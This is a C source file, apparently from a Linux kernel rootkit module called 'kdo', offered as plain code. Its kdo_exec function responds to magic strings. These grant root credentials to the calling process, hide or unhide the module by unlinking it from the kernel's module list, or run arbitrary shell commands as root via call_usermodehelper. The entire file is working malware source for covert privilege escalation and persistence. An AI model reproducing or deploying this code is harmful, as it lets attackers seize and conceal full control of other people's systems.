#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/umh.h>
#include <linux/version.h>

#include "kdo.h"
#include "cdev.h"
#include "config.h"
#include "exec.h"


static char _hidden = 0;
static struct list_head *mod_list_head;

static char _argv2[CDEV_MAX_WRITE];

static char *_argv[] = {EXEC_SHELL, "-c", _argv2, NULL};
static char *_envp[] = {"HOME=/root", "TERM=xterm", NULL};


static inline void _kdo_su(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
	current->uid  = current->gid  = 0;
	current->euid = current->egid = 0;
	current->suid  = current->sgid  = 0;
	current->fsuid = current->fsuid = 0;
	#else
	commit_creds(prepare_kernel_cred(NULL));
	#endif

	#ifdef DEBUG
	kdo_log_fmt(KERN_INFO, "root privileges granted to PID %i", current->pid);
	#endif
}

static int _kdo_run(const char *cmd)
{
	int ret;

	_argv2[strlen(cmd)] = 0x00;
	strncpy(_argv2, cmd, CDEV_MAX_WRITE);

	kdo_log_fmt(KERN_INFO, "%s", _argv2);
	ret = call_usermodehelper(_argv[0], _argv, _envp, UMH_NO_WAIT);

	#ifdef DEBUG
	if (ret)
		kdo_log_fmt(KERN_ERR, "call_usermodehelper failed with code %i", ret);
	#endif

	return ret;
}


static int _kdo_hide(void)
{
	if (_hidden) {
		#ifdef DEBUG
		kdo_log(KERN_ERR, "module already hidden");
		#endif
		return 1;
	}

	if (THIS_MODULE->sect_attrs) {
		kfree(THIS_MODULE->sect_attrs);
		THIS_MODULE->sect_attrs = NULL;

		#ifdef DEBUG
		kdo_log(KERN_INFO, "module sect_attrs freed");
		#endif
	}

	mod_list_head = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	_hidden = 1;

	#ifdef DEBUG
	kdo_log(KERN_INFO, "module hidden");
	#endif

	return 0;
}

static int _kdo_show(void)
{
	if (! _hidden) {
		#ifdef DEBUG
		kdo_log(KERN_ERR, "module already unhidden");
		#endif
		return 1;
	}

	list_add(&THIS_MODULE->list, mod_list_head);

	_hidden = 0;

	#ifdef DEBUG
	kdo_log(KERN_INFO, "module unhidden");
	#endif

	return 0;
}

int kdo_exec(const char *cmd)
{
	if (! strcmp(MAGIC_ROOT, cmd)) {
		_kdo_su();
		return 0;
	}

	if (! strcmp(MAGIC_HIDE, cmd))
		return _kdo_hide();

	if (! strcmp(MAGIC_SHOW, cmd))
		return _kdo_show();

	if (! strncmp(MAGIC_EXEC, cmd, strlen(MAGIC_EXEC)) && cmd[strlen(MAGIC_EXEC)])
		return _kdo_run(cmd + strlen(MAGIC_EXEC) + 1);

	return 1;
}
